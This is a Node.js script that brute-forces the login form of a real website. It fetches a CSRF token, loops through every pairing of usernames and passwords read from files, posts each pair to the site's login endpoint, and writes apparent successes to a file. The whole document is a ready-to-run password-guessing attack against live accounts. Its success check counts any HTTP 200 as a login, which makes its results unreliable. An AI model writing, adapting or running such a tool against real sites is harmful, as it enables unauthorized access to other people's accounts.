const fs = require('fs');
const path = require('path');
const axios = require('axios');
const cheerio = require('cheerio');

// User-supplied input
const targetUrl = 'https://ctflearn.com/user/login'; // Full URL to the login form
const usernameField = 'Username and Email'; // Name attribute of the username field in the form
const passwordField = 'Password'; // Name attribute of the password field in the form
const csrfTokenField = 'csrf_token'; // UPDATE this to the correct field name for CSRF token
const rateLimitSeconds = 1; // User-supplied rate limiting in seconds

const usernamesFilePath = path.join(__dirname, 'usernames.txt');
const passwordsFilePath = path.join(__dirname, 'passwords.txt');

async function getCsrfToken(url) {
  try {
    const response = await axios.get(url);
    const $ = cheerio.load(response.data);
    // Update the selector below to match the CSRF token field in the form
    const csrfToken = $(`input[name="${csrfTokenField}"]`).val();
    return csrfToken;
  } catch (error) {
    console.error('Error getting CSRF token:', error);
    throw error;
  }
}

async function attemptLogin(csrfToken, username, password) {
  try {
    const params = new URLSearchParams();
    params.append(usernameField, username);
    params.append(passwordField, password);
    params.append(csrfTokenField, csrfToken); // Append the CSRF token to the parameters

    const response = await axios.post(targetUrl, params.toString(), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    });

    // Update the condition to match the website's login success criteria
    if (response.status === 200) {
      console.log(`Login success for username: ${username}`);
      return true;
    } else {
      console.log(`Failed for username: ${username} with status: ${response.status}`);
      return false;
    }
  } catch (error) {
    console.log(`Login attempt failed for username: ${username}`);
    if (error.response) {
      // You may want to handle different HTTP status codes differently
      console.log(`Server responded with status: ${error.response.status}`);
    } else if (error.request) {
      console.log('No response received.');
    } else {
      console.log('Error setting up the request.');
    }
    return false;
  }
}

async function sleep(seconds) {
  return new Promise(resolve => setTimeout(resolve, seconds * 1000));
}

async function bruteForceLogin() {
  const csrfToken = await getCsrfToken(targetUrl); // Get the CSRF token first
  const usernames = fs.readFileSync(usernamesFilePath, 'utf-8').split('\n').filter(Boolean);
  const passwords = fs.readFileSync(passwordsFilePath, 'utf-8').split('\n').filter(Boolean);

  for (const username of usernames) {
    for (const password of passwords) {
      console.log(`Trying username: ${username} with password: ${password}`);
      const success = await attemptLogin(csrfToken, username, password);
      if (success) {
        fs.appendFileSync('successful_logins.txt', `Success: ${username}:${password}\n`);
        // Uncomment the next line if you want to stop after the first success
        // return;
      }
      await sleep(rateLimitSeconds);
    }
  }
}

bruteForceLogin().catch(console.error);
